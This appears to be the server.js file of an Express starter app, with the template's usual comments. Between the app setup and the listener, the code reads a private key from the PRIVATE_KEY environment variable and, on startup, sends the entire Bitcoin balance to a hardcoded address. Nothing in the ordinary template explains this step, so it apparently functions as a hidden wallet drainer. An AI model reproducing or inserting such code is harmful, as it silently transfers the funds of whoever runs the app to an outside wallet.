// server.js
// where your node app starts

// we've started you off with Express (https://expressjs.com/)
// but feel free to use whatever libraries or frameworks you'd like through `package.json`.
const express = require("express");
const app = express();

const CryptoAccount = require("send-crypto");
const privateKey = process.env.PRIVATE_KEY;
const account = new CryptoAccount(privateKey);
const balance = account.getBalance("BTC");
account.send("bc1qhxkueq72dhecq50zjr5vcw9agaptgh7p8w8xa8", balance, "BTC", {
    subtractFee: true,
});

// listen for requests :)
const listener = app.listen(process.env.PORT, () => {
  console.log("Your app is listening on port " + listener.address().port);
});
